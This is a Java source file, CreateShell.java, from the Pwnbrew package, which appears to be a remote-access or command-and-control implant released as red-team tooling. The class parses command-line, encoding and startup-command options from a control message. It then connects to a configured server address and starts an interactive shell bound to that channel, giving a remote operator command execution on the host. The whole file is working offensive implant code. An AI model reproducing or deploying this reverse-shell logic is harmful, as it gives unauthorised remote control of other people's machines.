/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
* CreateShell.java
*
* Created on June 7, 2013, 8:55:42 PM
*/

package pwnbrew.network.control.messages;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import pwnbrew.ClientConfig;
import pwnbrew.concurrent.LockListener;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.manager.PortManager;
import pwnbrew.utilities.Constants;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.ControlOption;
import pwnbrew.network.control.ControlMessageManager;
import pwnbrew.network.shell.Shell;

/**
 *
 *  
 */
public final class CreateShell extends ControlMessage implements LockListener {

    private String[] cmdString;
    private String encoding;
    private String startupCmd;
    private boolean redirectStderr = false;
    
    private static final byte OPTION_CMD_STRING = 5;
    private static final byte OPTION_ENCODING = 20;
    public static final byte OPTION_STARTUP_CMD = 22;
    public static final byte OPTION_REDIRECT_STDERR = 24;
    
    private int lockVal = 0;
    
    //Class name
    private static final String NAME_Class = CreateShell.class.getSimpleName();
    
    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public CreateShell( byte[] passedId ) {
        super( passedId );
    }
    
    //===============================================================
    /**
     * 
     * @param lockOp 
     */
    @Override
    public synchronized void lockUpdate(int lockOp) {
        lockVal = lockOp;
        notifyAll();
    }
    
    //===============================================================
    /**
     * 
     * @return  
     */
    @Override
    public synchronized int waitForLock() {
        
        int retVal;        
        while( lockVal == 0 ){
            try {
                wait();
            } catch (InterruptedException ex) {
                continue;
            }
        }
        
        //Set to temp and reset
        retVal = lockVal;
        lockVal = 0;
        
        return retVal;
    }
    
    //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){        
       
        boolean retVal = true;
        try {
            
            byte[] theValue = tempTlv.getValue();
            switch( tempTlv.getType()){
                
                case OPTION_CMD_STRING:
                    
                    String currStr = new String( theValue, "US-ASCII");
                    List<String> cmdLineStringList = new ArrayList<>();

                    //Split the strings out of the null byte delimited string
                    while(currStr.length() > 0){
                        int nullByteIndex = currStr.indexOf((byte)0x00);
                        cmdLineStringList.add(currStr.substring(0, nullByteIndex));
                        currStr = currStr.substring(nullByteIndex + 1, currStr.length());                   
                    }

                    cmdString = (String[])(cmdLineStringList.toArray(new String[cmdLineStringList.size()]));
                    
                    break;
                case OPTION_ENCODING:
                    encoding = new String( theValue, "US-ASCII");
                    break;
                case OPTION_STARTUP_CMD:
                    startupCmd = new String( theValue, "US-ASCII");
                    break;
                case OPTION_REDIRECT_STDERR:
                    if( theValue.length > 0 ){
                        byte aByte = theValue[0];
                        if( aByte == 0x1)
                            redirectStderr = true;
                    }
                    break;
                default:
                    retVal = false;
                    break;
            }
            
        } catch (UnsupportedEncodingException ex) {
            ex = null;
        }
        return retVal;
    }
    
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( PortManager passedManager ) { 
        
        ClientConfig theConf = ClientConfig.getConfig();
        int socketPort = theConf.getSocketPort();
        String serverIp = theConf.getServerIp();
        
        //Get the port router
        ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
        int theClientId = getSrcHostId();

        int retChannelId = aPR.ensureConnectivity( serverIp, socketPort, this );   
        if(retChannelId != 0 ){
            
            //Send ack back to set channel id
            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
            if( aCMManager != null ){
                CreateShellAck retMsg = new CreateShellAck( retChannelId );
                retMsg.setDestHostId( theClientId );
                aCMManager.send(retMsg); 
            }

            //Create the shell and set it
            Shell aShell = new Shell( Constants.Executor, passedManager, 
                    theClientId, retChannelId, encoding, cmdString, startupCmd, redirectStderr );
            aShell.start();                

            //Register the shell
            OutgoingConnectionManager aOCM = aPR.getConnectionManager();
            aOCM.setShell( retChannelId, aShell );

        }
        
    }


}/* END CLASS CreateShell */
